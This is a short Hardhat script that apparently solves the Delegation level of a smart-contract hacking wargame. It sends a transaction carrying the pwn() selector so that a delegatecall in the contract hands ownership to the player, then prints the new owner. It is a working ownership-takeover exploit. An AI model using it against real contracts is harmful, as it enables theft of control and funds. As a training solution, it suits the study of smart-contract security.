// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
require('dotenv').config({ path: __dirname + '/.env' });

const { ethers } = require("hardhat");

async function main() {
    [player] = await ethers.getSigners();
    delegation = await ethers.getContractAt("Delegation", process.env.DELEGATION_ADDRESS);
    transactionResponse = await player.sendTransaction({
        to: delegation.address,
        gasLimit: 2_000_000,
        // data: (new ethers.utils.Interface(["function pwn() public"])).encodeFunctionData("pwn")
        data: "0xdd365b8b" //first 4bytes of signature of "pwn()"
    });
    await transactionResponse.wait();
    console.log("Owner of Delegation is ", await delegation.owner());

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
// run this script after Fallback contract was deployed
// npx hardhat run scripts/deploy.js --network goerli